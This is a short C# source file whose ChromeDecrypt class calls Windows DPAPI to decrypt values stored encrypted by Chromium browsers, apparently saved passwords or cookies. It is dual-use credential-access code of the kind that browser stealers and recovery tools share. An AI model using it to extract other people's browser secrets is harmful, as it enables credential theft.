namespace PEngine.Engine.Browsers.Chromium
{
    using System.Security.Cryptography;
    using System.Text;

    public sealed class ChromeDecrypt
    {
        public static string DecryptValue(byte[] encrypted_value, DataProtectionScope scope, byte[] optionalEntropy = null)
        {
            try
            {
                return Encoding.ASCII.GetString(ProtectedData.Unprotect(encrypted_value, optionalEntropy, scope)).TrimEnd('\0');
            }
            catch
            {
                return null;
            }
        }
    }
}